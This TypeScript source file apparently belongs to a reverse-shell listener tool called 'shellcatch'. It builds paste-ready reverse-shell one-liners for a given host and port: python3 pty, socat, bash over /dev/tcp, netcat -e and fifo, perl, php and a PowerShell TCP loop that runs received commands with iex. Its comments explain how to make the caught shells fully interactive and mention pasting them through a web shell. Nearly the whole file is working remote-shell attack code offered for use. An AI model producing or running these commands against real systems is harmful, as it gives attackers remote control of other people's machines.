// The paste-ready catch one-liners for one shellcatch listener's public
// endpoint: the classic documented reverse-shell shapes across the
// interpreter families a target is likely to have. Pure rendering of
// (host, port) into commands -- no credential is minted, so the client
// renders from the listener roster it already holds. The Launchers tab is
// the one-liner home; the shells roster links there.

export interface CatchLauncher {
  id: string
  os: string
  command: string
}

export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
  const hostPort = publicEndpoint.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '')
  const colon = hostPort.lastIndexOf(':')
  if (colon <= 0 || colon === hostPort.length - 1) return []
  const host = hostPort.slice(0, colon).replace(/^\[/, '').replace(/\]$/, '')
  const port = hostPort.slice(colon + 1)
  if (!/^\d+$/.test(port)) return []
  const fifo = '/tmp/.rod-catch'
  return [
    // The python pty shape leads: it is the full-interactive catch -- a real
    // pty is what echoes typing, colors the prompt, turns ^C into SIGINT,
    // and runs full-screen programs. python3 is the dependency most targets
    // actually have (socat and script are rarer); the socat shape serves the
    // targets that have it instead, and the plain shapes are the last
    // resort -- they work, but the shell has no terminal, so typing has no
    // echo and ^C is just a byte.
    {
      id: 'unix-python-pty',
      os: 'linux',
      command:
        `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(["/bin/sh","-c","stty rows 30 cols 120; export TERM=xterm-256color; exec bash -i"])'`,
    },

    {
      id: 'unix-socat',
      os: 'linux',
      // The same pty posture over socat, for targets that have it: the exec
      // preamble sizes the pty and names its terminal type before
      // the shell runs: a pty at the default 0x0 refuses full-screen
      // programs (vim, top), and without TERM the target's programs fall
      // back to terminal types with no colors (vim's E558 warning). The
      // catch socket carries no resize channel, so the geometry is fixed
      // here -- and the console mirrors it.
      command:
        `socat exec:'stty rows 30 cols 120; export TERM=xterm-256color; exec bash -i',pty,stderr,setsid,sigint,sane tcp:${host}:${port}`,
    },

    {
      id: 'unix-bash',
      os: 'linux',
      // No pty here -- the plain bash-over-socket shape. The TERM default
      // keeps the target's rc files on their colored-prompt branch when the
      // paste context carries no TERM (a web shell, a bare exec): without it
      // the prompt comes up colorless. TERM from a real terminal passes
      // through unchanged.
      command: `export TERM=\${TERM:-xterm-256color}; bash -i >& /dev/tcp/${host}/${port} 0>&1`,
    },

    // The -e flag belongs to traditional/GNU netcat; the OpenBSD build
    // refuses it, so the fifo shape (a /bin/sh over the pipe) rides beside
    // it. Showing both costs nothing while a missing one costs a round trip.
    { id: 'unix-nc', os: 'linux', command: `nc -e /bin/sh ${host} ${port}` },
    {
      id: 'unix-nc-fifo',
      os: 'linux',
      command: `rm -f ${fifo}; mkfifo ${fifo}; cat ${fifo} | /bin/sh -i 2>&1 | nc ${host} ${port} > ${fifo}`,
    },

    { id: 'unix-python', os: 'linux', command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },

    { id: 'unix-perl', os: 'linux', command: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },

    { id: 'unix-php', os: 'linux', command: `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },

    {
      id: 'windows-powershell',
      os: 'windows',
      command:
        `powershell -c "$c=New-Object Net.Sockets.TCPClient('${host}',${port});` +
        `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};` +
        `while(($i=$s.Read($b,0,$b.Length)) -ne 0){` +
        `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);` +
        `$o=(iex $d 2>&1|Out-String);` +
        `$r=$o+'PS '+(pwd).Path+'> ';` +
        `$q=[text.encoding]::ASCII.GetBytes($r);` +
        `$s.Write($q,0,$q.Length);$s.Flush()};$c.Close()"`,
    },
  ]
}
